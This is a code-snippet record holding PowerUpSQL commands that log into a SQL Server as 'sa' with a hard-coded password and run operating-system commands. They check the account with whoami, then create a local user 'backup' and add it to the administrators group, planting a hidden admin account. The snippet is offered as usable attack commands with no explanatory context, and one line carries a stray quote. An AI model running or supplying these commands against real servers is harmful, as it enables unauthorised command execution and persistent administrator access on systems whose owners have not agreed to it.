---
id: ff4c2eb0-21be-4234-86df-f3759c410095
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:20.233957+00:00'
updated_at: '2023-04-10T20:36:45.397818+00:00'
---

# Code Snippet ff4c2eb0

**Language**: ps1

```ps1
PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command whoami

# Creates and adds local user backup to the local administrators group:
PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net user backup Password1234 /add'" -Verbose
PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net localgroup administrators backup /add" -Verbose
```
